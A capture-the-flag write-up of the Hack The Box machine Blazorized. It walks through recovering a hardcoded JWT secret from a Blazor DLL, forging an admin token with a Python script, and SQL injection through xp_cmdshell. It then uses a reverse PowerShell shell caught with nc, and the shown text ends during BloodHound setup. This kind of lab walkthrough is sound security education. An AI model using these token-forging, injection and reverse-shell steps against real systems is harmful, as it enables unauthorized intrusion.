---
title: HTB: Blazorized
url: https://0xdf.gitlab.io/2024/11/09/htb-blazorized.html
date: 2024-11-09T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, ctf, htb-blazorized, nmap, windows, ffuf, subdomain, netexec, blazor, dotnet, burp, burp-proxy, feroxbuster, blazor-traffic-processor, dotpeek, jwt, python-pyjwt, python, sqli, xp-cmdshell, bloodhound, bloodhound-ce, sharphound, writespn, targeted-kerberoast, powerview, script-path, dc-sync, mimikatz, htb-mist
---

![Blazorized](/img/blazorized-cover.png)

Blazorized in a Windows-focused box, starting with a website written using the Blazor .NET framework. I’ll reverse a DLL that comes from the server to the browser to find a JWT secret and use it to get access to the admin panel. There I’ll abuse SQL injection to get execution and a shell. To pivot to the next user, I’ll abuse the WriteSPN privilege to perform a targeted Kerberoast attack. Then I’ll abuse permissions to write another user’s login script. Finally, I’ll abuse the `GetChangesAll` permission with Mimikatz to dump the hashes for the domain and get a shell as administrator.

## Box Info

| Name | [Blazorized](https://hackthebox.com/machines/blazorized)  [Blazorized](https://hackthebox.com/machines/blazorized) [Play on HackTheBox](https://hackthebox.com/machines/blazorized) |
| --- | --- |
| Release Date | [29 Jun 2024](https://twitter.com/hackthebox_eu/status/1806356826704785542) |
| Retire Date | 09 Nov 2024 |
| OS | Windows Windows |
| Base Points | ~~Medium [30]~~ Hard [40] |
| Rated Difficulty | Rated difficulty for Blazorized |
| Radar Graph | Radar chart for Blazorized |
| First Blood User | 00:44:29[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 09:21:56[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [Pedant Pedant](https://app.hackthebox.com/users/927345) |

## Recon

### nmap

`nmap` finds many open TCP ports indicative of a Windows active directory domain controller:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.22
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 11:04 GMT
Nmap scan report for 10.10.11.22
Host is up (0.086s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49693/tcp open  unknown
49707/tcp open  unknown
49765/tcp open  unknown
49776/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV 10.10.11.22
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 11:05 GMT
Nmap scan report for 10.10.11.22
Host is up (0.086s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://blazorized.htb
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-31 11:05:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-10-28T09:37:48
|_Not valid after:  2054-10-28T09:37:48
|_ssl-date: 2024-10-31T11:06:01+00:00; +18s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 18s, deviation: 0s, median: 17s
| smb2-time:
|   date: 2024-10-31T11:05:57
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.94 seconds

```

In addition to the typical DC ports (DNS on 53, Kerberos on 88, RPC on 135, netbios on 139, SMB on 445, LDAP on 389 and several others), there’s also a webserver on 80, MSSQL on 1433, and WinRM on 5985.

`nmap` also identifies a hostname, `DC1`.

The webserver is redirecting to `blazorized.htb`, indicating virtual host-based routing.

### Subdomain Fuzz

Given the use of host-based routing, I’ll use `ffuf` to brute force any subdomains of `blazorized.htb` that respond differently:

```

oxdf@hacky$ ffuf -u http://10.10.11.22 -H "Host: FUZZ.blazorized.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.22
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.blazorized.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 2077, Words: 149, Lines: 28, Duration: 107ms]
:: Progress: [19966/19966] :: Job [1/1] :: 466 req/sec :: Duration: [0:00:43] :: Errors: 0 ::

```

It finds `admin.blazorized.htb`. I’ll add these to my `/etc/hosts` file, along with the hostname:

```
10.10.11.22 blazorized.htb admin.blazorized.htb dc1.blazorized.htb

```

### SMB - TCP 445

`netexec` confirms the domain and hostname:

```

oxdf@hacky$ netexec smb blazorized.htb
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)

```

I’m not able to access any share information anonymously:

```

oxdf@hacky$ netexec smb blazorized.htb --shares
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.22     445    DC1              [-] IndexError: list index out of range
SMB         10.10.11.22     445    DC1              [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
oxdf@hacky$ netexec smb blazorized.htb -u guest -p '' --shares
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.22     445    DC1              [-] blazorized.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb blazorized.htb -u oxdf -p '' --shares
SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.22     445    DC1              [-] blazorized.htb\oxdf: STATUS_LOGON_FAILURE 

```

### blazorized.htb - TCP 80

#### Site

The site is a personal “digital garden”:

![image-20241031102331850](/img/image-20241031102331850.png)

“Check for Updates” has an interesting button describing the API:

![image-20241031113605830](/img/image-20241031113605830.png)

Clicking it doesn’t do anything, but in the background I can see requests for `api.blazorized.htb`:

![image-20241031113649477](/img/image-20241031113649477.png)

On adding that to my `hosts` file, it runs and three new items are added to the menu:

![image-20241031113747526](/img/image-20241031113747526.png)

These have short blog posts about programming and technical fields:

![image-20241031113834212](/img/image-20241031113834212.png)

#### Tech Stack

The site footer says it is “built with love using Blazor WebAssembly”. [Blazor](https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor) is a .NET and C# frontend framework for building interactive web applications without writing JavaScript.

The HTTP response headers show it’s running IIS:

```

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Sun, 25 Feb 2024 13:26:10 GMT
Accept-Ranges: bytes
ETag: "e2328d32ee67da1:0"
Server: Microsoft-IIS/10.0
Date: Thu, 31 Oct 2024 14:24:48 GMT
Content-Length: 1542

```

The 404 page is the [standard Blazor component](/cheatsheets/404#blazor) in the custom template:

![image-20241031114409443](/img/image-20241031114409443.png)

#### Requests

On loading just the main page, there are a ton of components that are loaded by the browser:

![image-20241031114637637](/img/image-20241031114637637.png)

Of the more than 70 requests made, there are a couple interesting JavaScript files (referencing the web assembly), as well as a *ton* of `.dll` files used by the browser.

I’m also interested in what happens on the “Check for Updates” page. In general, moving around the site doesn’t require any additional requests. However, when I load the “Check for Updates” page, a single DLL is requested, and then there are API requests that follow:

![image-20241031140207978](/img/image-20241031140207978.png)

The API requests have a JWT token set:

![image-20241031130607371](/img/image-20241031130607371.png)

Interestingly, this doesn’t seem to have come from the server, so it must be generated in one of the DLLs that is loaded.

Actually clicking the button doesn’t send any requests - the additional functionality comes from `Blazorized.Helpers.dll`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds nothing interesting at all:

```

oxdf@hacky$ feroxbuster -u http://blazorized.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://blazorized.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       34l       82w     1542c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400      GET        6l       26w      324c http://blazorized.htb/error%1F_log
[####################] - 53s    30000/30000   0s      found:1       errors:0
[####################] - 53s    30000/30000   571/s   http://blazorized.htb/  

```

### admin.blazorized.htb

#### Site

The admin page offers a signin form:

![image-20241031123903982](/img/image-20241031123903982.png)

Not much I can do here.

It does say it’s using “Blazor Server”, which is different from the main site.

#### Requests

The requests pattern on this site is very different from the main site. Instead of downloading a bunch of DLLs, it starts a series of requests with `/_blazor`:

![image-20241031150358721](/img/image-20241031150358721.png)

The first POST is what sets this up, with this response:

```

HTTP/1.1 200 OK
Content-Length: 253
Content-Type: application/json
Server: Microsoft-IIS/10.0
Date: Thu, 31 Oct 2024 18:41:59 GMT

{"negotiateVersion":1,"connectionId":"dd4rkhYR-UqSSTlpQVQpwg","connectionToken":"zVRoNQg34-yfBj1nM1epMw","availableTransports":[{"transport":"ServerSentEvents","transferFormats":["Text"]},{"transport":"LongPolling","transferFormats":["Text","Binary"]}]}

```

It’s using the `LongPolling` transport. A few requests later, there’s a GET request with a bunch of binary data in the response:

![image-20241031150551603](/img/image-20241031150551603.png)

I’ll install the Blazor Traffic Processor from the BApp Store:

![image-20241031150624999](/img/image-20241031150624999.png)

And send this data to that, where it is decoded:

![image-20241031150647863](/img/image-20241031150647863.png)

A bit into the payload is this message:

```

{
   "Target": "JS.BeginInvokeJS",
   "Headers": 0,
   "Arguments": [
      3,
      "localStorage.getItem",
      ["jwt"],
      0,
      0
   ],
   "MessageType": 1
},

```

It’s fetching an item named `jwt` from the browser local storage. I’ll need to know that later.

### api.blazorized.htb

The `api` root returns an empty page:

```

HTTP/1.1 404 Not Found
Server: Microsoft-IIS/10.0
Date: Thu, 31 Oct 2024 16:57:47 GMT
Content-Length: 0

```

From the main page, there was a get to `/posts`. Trying to load that returns empty 404 as well.

Above I got a JSON blob with data. The difference is the `authorization` header with a token. That token gives the rights to the `Posts_Get_All` and `Categories_Get_All` roles:

```

>>> jwt.decode(token, options={'verify_signature': False})
{
  'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress': 'superadmin@blazorized.htb', 
  'http://schemas.microsoft.com/ws/2008/06/identity/claims/role': ['Posts_Get_All', 'Categories_Get_All'],
  'exp': 1730389091,
  'iss': 'http://api.blazorized.htb',
  'aud': 'http://api.blazorized.htb'
}

```

There’s also a `/swagger/` endpoint that offers details about the API:

![image-20241031135517704](/img/image-20241031135517704.png)

Nothing too interesting here.

### Blazorized.Helper.dll

#### Overview

`Blazorized.Helper.dll` is a .NET binary, so I’ll open it in [DotPeek](https://www.jetbrains.com/decompiler/) on Windows (though I’m sure [ILSply](https://github.com/icsharpcode/ILSpy) would also work on Linux). The tree structure on the left side shows an overview of the various classes:

![image-20241031140720778](/img/image-20241031140720778.png)

#### Posts / Classes

Both the `Posts` and `Categories` classes seem to just provide a list of GUIDs for various posts / categories. For example:

```

using System;
using System.Collections.Generic;

#nullable enable
namespace Blazorized.Helpers
{
  public static class Categories
  {
    public static List<Guid> ReadOnlyCategoryGUIDs = new List<Guid>()
    {
      new Guid("C5EA5494-D606-4D8D-8979-1065DC67971D"),
      new Guid("9A445790-F7E8-4351-8CF4-46FCAE383EEC"),
      new Guid("916D0F55-43DA-4F66-9CE0-48CDB3F956D6"),
      new Guid("49BCC54A-E29F-4FCB-84D2-5DDDCD2068A9"),
      new Guid("2A35AA74-87F0-4A22-8C9A-8A10F4856F43"),
      new Guid("92824CD1-4C94-46E6-A982-96C9C8E0B20C"),
      new Guid("D8F945F9-2D12-4691-ACFB-A9CEF2F9B23C"),
      new Guid("6C9F2B96-6F80-4E48-8169-AC2CC2D06260"),
      new Guid("9BD1D7A7-53C9-4E76-9AA5-BD93D60C4579"),
      new Guid("3F6D48D8-0944-4317-84A0-D2A2A5DCA6E1")
    };

    public static bool IsReadOnly(Guid ID) => Categories.ReadOnlyCategoryGUIDs.Contains(ID);
  }
}

```

Nothing too exciting here.

#### Passwords

The `Passwords` class has a single function to generate a random password:

```

using System;
using System.Linq;

#nullable enable
namespace Blazorized.Helpers
{
  public static class Passwords
  {
    public static string allChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@^&*()-_=+|;:'<>/?";

    public static string GenerateRandomPassword(int length)
    {
      length = Math.Max(length, 32);
      try
      {
        Random random = new Random();
        return new string(Enumerable.Repeat<string>(Passwords.allChars, length).Select<string, char>((Func<string, char>) (s => s[random.Next(s.Length)])).ToArray<char>());
      }
      catch (Exception ex)
      {
        throw;
      }
    }
  }
}

```

#### JWT

The `JWT` class has all the interesting stuff. Right at the top, the JWT key is hardcoded, along with other configuration information:

```

#nullable enable
namespace Blazorized.Helpers
{
  public static class JWT
  {
    private const long EXPIRATION_DURATION_IN_SECONDS = 60;
    private static readonly string jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";
    private static readonly string superAdminEmailClaimValue = "superadmin@blazorized.htb";
    private static readonly string postsPermissionsClaimValue = "Posts_Get_All";
    private static readonly string categoriesPermissionsClaimValue = "Categories_Get_All";
    private static readonly string superAdminRoleClaimValue = "Super_Admin";
    private static readonly string issuer = "http://api.blazorized.htb";
    private static readonly string apiAudience = "http://api.blazorized.htb";
    private static readonly string adminDashboardAudience = "http://admin.blazorized.htb";

```

I’ve seen the `Posts_Get_All` and `Categories_Get_All` claims already, but `Super_Admin` and `superadmin@blazorized.htb` are new ones.

The `GenerateTemporaryJWT` function makes the JWT I used with the API already without knowing it.

`GenerateSuperAdminJWT` makes a different JWT:

```

    public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60)
    {
      try
      {
        List<Claim> claimList1 = new List<Claim>()
        {
          new Claim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress", JWT.superAdminEmailClaimValue),
          new Claim("http://schemas.microsoft.com/ws/2008/06/identity/claims/role", JWT.superAdminRoleClaimValue)
        };
        string issuer = JWT.issuer;
        string dashboardAudience = JWT.adminDashboardAudience;
        List<Claim> claimList2 = claimList1;
        SigningCredentials signingCredentials1 = JWT.GetSigningCredentials();
        DateTime? nullable1 = new DateTime?(DateTime.UtcNow.AddSeconds((double) expirationDurationInSeconds));
        DateTime? nullable2 = new DateTime?();
        DateTime? nullable3 = nullable1;
        SigningCredentials signingCredentials2 = signingCredentials1;
        return ((SecurityTokenHandler) new JwtSecurityTokenHandler()).WriteToken((SecurityToken) new JwtSecurityToken(issuer, dashboardAudience, (IEnumerable<Claim>) claimList2, nullable2, nullable3, signingCredentials2));
      }
      catch (Exception ex)
      {
        throw;
      }
    }

```

I’ll note in signing and verifying the token the code uses `HS512` as the algirithm:

```

    private static SigningCredentials GetSigningCredentials()
    {
      try
      {
        return new SigningCredentials((SecurityKey) new SymmetricSecurityKey(Encoding.UTF8.GetBytes(JWT.jwtSymmetricSecurityKey)), "HS512");
      }
      catch (Exception ex)
      {
        throw;
      }
    }

```

## Shell as nu\_1055

### Admin Panel Access

#### Generate Token

It seems reasonable to think that the `GenerateSuperADminJWT` function is what generates a JWT for `admin.blazorized.htb`. I’ll write a simple Python script mirroring what’s in the C# above (though I’m giving myself a much longer expiration):

```

import jwt
from time import time

secret = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a"
data = {
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Super_Admin",
    "iss": "http://api.blazorized.htb",
    "aud": "http://admin.blazorized.htb",
    "exp": int(time() + 60 * 60 * 24 * 10),
}

token = jwt.encode(data, secret, algorithm='HS512')

print(token)

```

Running this makes a JWT:

```

oxdf@hacky$ python generate_sa_jwt.py 
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FkbWluLmJsYXpvcml6ZWQuaHRiIiwiZXhwIjoxNzMxMjY1NzIxfQ.e10acViU9cBSwjKEklNx_g24eADazxyK5eCHUUK3xIGV-z3u9luUe5UYIQPOotIAWu7XHAHcUntJ9AKHfpdRAg

```

#### Add to Browser

As I identified [above](#requests-1), the application tries to read a value named `jwt` from local storage, so I’ll guess that perhaps is where this should be stored. I’ll open the browser dev tools and under “Storage”, go to “Local Storage” for `http://admin/blazorized.htb` and add this value:

![image-20241031151039240](/img/image-20241031151039240.png)

On refreshing `admin.blazorized.htb`, there’s a new page:

![image-20241031151102949](/img/image-20241031151102949.png)

#### Site Enumeration

The menu on the admin panel offers a bunch of options. There’s management for Posts and Categories, each with a manage page, a create page, and a “Check for Duplicate” page.

The manage page for both shows the existing ones. For example, Categories:

![image-20241031152457827](/img/image-20241031152457827.png)

The edit and delete buttons show an error if pressed:

![image-20241031152516915](/img/image-20241031152516915.png)

The “Create” form offers a chance to create a post or category:

![image-20241031152536763](/img/image-20241031152536763.png)

I can create one, and there’s no error, but it doesn’t show up on the main site.

Finally, the check for duplicate pages offer a chance to check if a post title or category has been used:

![image-20241031152637586](/img/image-20241031152637586.png)

This implies that the title is not a unique field in the database. Searching for a word gives a popup at the top of the window:

![image-20241031152916605](/img/image-20241031152916605.png)

### SQL Injection

#### POC

In the duplicates form, there’s SQL injection. If I enter a post title of just a single quote, nothing returns.

Searching for `' or 1=1;-- -` shows it finds all 15 posts:

![image-20241031152805257](/img/image-20241031152805257.png)

#### Stacked Queries

To check for execution, I’ll try the `xp_cmdshell` stored procedure. It is typically not enabled, but it’s worth a shot. Because the result won’t necessarily be returned, I’ll run `ping` and look for ICMP with `tcpdump`:

![image-20241031153249795](/img/image-20241031153249795.png)

On submitting, there’s a delay for a few seconds, and then:

![image-20241031153306782](/img/image-20241031153306782.png)

At `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:31:45.980974 IP 10.10.11.22 > 10.10.14.6: ICMP echo request, id 1, seq 8478, length 40
19:31:45.981002 IP 10.10.14.6 > 10.10.11.22: ICMP echo reply, id 1, seq 8478, length 40
19:31:46.984958 IP 10.10.11.22 > 10.10.14.6: ICMP echo request, id 1, seq 8479, length 40
19:31:46.984978 IP 10.10.14.6 > 10.10.11.22: ICMP echo reply, id 1, seq 8479, length 40
19:31:48.000432 IP 10.10.11.22 > 10.10.14.6: ICMP echo request, id 1, seq 8480, length 40
19:31:48.000462 IP 10.10.14.6 > 10.10.11.22: ICMP echo reply, id 1, seq 8480, length 40
19:31:49.016183 IP 10.10.11.22 > 10.10.14.6: ICMP echo request, id 1, seq 8481, length 40
19:31:49.016200 IP 10.10.14.6 > 10.10.11.22: ICMP echo reply, id 1, seq 8481, length 40

```

That’s remote code execution.

#### Shell

To get a shell, I’ll grab the PowerShell #3 (Base64) payload from [revshells.com](https://www.revshells.com/) and replace `ping 10.10.14.6` with that in the form:

![image-20241031153448250](/img/image-20241031153448250.png)

On sending, I get a shell as nu\_1055 at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.22 49828

PS C:\Windows\system32> whoami
blazorized\nu_1055

```

I’ll find `user.txt` on the desktop:

```

PS C:\users\nu_1055\desktop> type user.txt
6c6560db************************

```

## Shell as rsa\_4810

### Enumeration

#### Home Directories

There are three non-admin users with home directories on Blazorized:

```

PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/2/2024   4:13 PM                Administrator
d-----        2/25/2024   2:41 PM                NU_1055
d-r---        10/6/2021   3:46 PM                Public
d-----         2/1/2024   8:36 AM                RSA_4810
d-----        6/19/2024   8:39 AM                SSA_6010  

```

nu\_1055 can’t access anyone else’s, and there’s nothing interesting in their home directory.

#### Web Data

The IIS web directories are in `\inetpub`:

```

PS C:\inetpub> ls

    Directory: C:\inetpub

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2024   5:17 AM                custerr
d-----        6/27/2024   8:05 AM                history
d-----         1/9/2024   5:17 AM                logs
d-----         1/9/2024   5:18 AM                temp
d-----        1/18/2024   2:00 PM                wwwroot  

```

In `wwwroot` there’s a folder for each domain, as well as the `web.config` file that handles the virtual host-based routing:

```

PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/21/2024   4:44 PM                Blazorized.API
d-----        2/25/2024   7:26 AM                Blazorized.DigitalGarden
d-----        2/25/2024   7:38 AM                Blazorized.DigitalGardenAdmin
-a----         1/9/2024   5:17 AM            703 iisstart.htm
-a----         1/9/2024   5:17 AM          99710 iisstart.png
-a----        1/18/2024   2:13 PM            583 web.config

```

The web applications are a series of compiled executables (`.dll`). I can come look at them if I need to, but I won’t need to in this case.

#### Other File System

The root of the `C:\` drive has a couple interesting directories:

```

PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/9/2024   5:17 AM                inetpub
d-----         2/1/2024   6:24 AM                Microsoft
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---        6/21/2024   9:02 AM                Program Files
d-----         2/1/2024   4:34 AM                Program Files (x86)
d-----        1/16/2024   7:23 PM                SQL2022
d-----        6/19/2024  11:45 AM                Temp
d-r---        6/20/2024   7:28 AM                Users
d-----        6/21/2024   9:40 AM                Windows   

```

`Microsoft` has a file at `C:\Microsoft\Windows\PowerShell\StartupProfileData-Interactive`. This file shows up when PowerShell is run in an odd way, but isn’t interesting as far as exploiting the box.

`SQL2022` is empty.

### Bloodhound

#### Setup

I’m using the newer Bloodhound-CE, which runs really nicely as a Docker container. I’ll set it up with a `curl` command into `docker compose`:

```

oxdf@hacky$ curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   156  100   156    0     0    335      0 --:--:-- --:--:-- --:--:--   335
100  3784  100  3784    0     0   4615      0 --:--:-- --:--:-- --:--:--  4615
[+] Running 1/0
 ✔ Container blazorized-10101122-app-db-1  Running                                                                                                                                                                                       0.0s
Attaching to app-db-1, bloodhound-1, graph-db-1
graph-db-1    | Changed password for user 'neo4j'. IMPORTANT: this change will only take effect if performed before the database is started for the first time.
graph-db-1    | 2024-11-01 11:00:44.324+0000 INFO  Starting...
graph-db-1    | 2024-11-01 11:00:44.616+0000 INFO  This instance is ServerId{e9b76907} (e9b76907-bc64-4830-b858-eeb2203107ce)
graph-db-1    | 2024-11-01 11:00:45.407+0000 INFO  ======== Neo4j 4.4.38 ========
graph-db-1    | 2024-11-01 11:00:47.121+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
graph-db-1    | 2024-11-01 11:00:47.129+0000 INFO  Setting up initial user from `auth.ini` file: neo4j
graph-db-1    | 2024-11-01 11:00:47.129+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=false, suspended=false)
graph-db-1    | 2024-11-01 11:00:47.147+0000 INFO  Setting version for 'security-users' to 3
...[snip]...

```

This is the same command in the [documentation](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose) except I added `BLOODHOUND_PORT=8888` as by default it wants to run the webserver on 8080 where I have Burp already listening.

About 50 lines into the output it prints a random temporary password:

![image-20241101070407691](/img/image-20241101070407691.png)

I’ll visit `localhost:8888` and it presents a Bloodhound login screen. I’ll log in with the username admin and the password given, and update it when prompted.

On the next window, it shows there’s no data in this database (which is expected as I haven’t even collected any yet):

![image-20241101070549387](/img/image-20241101070549387.png)

The gear icon at the top right offers a menu that includes “Download Collectors”:

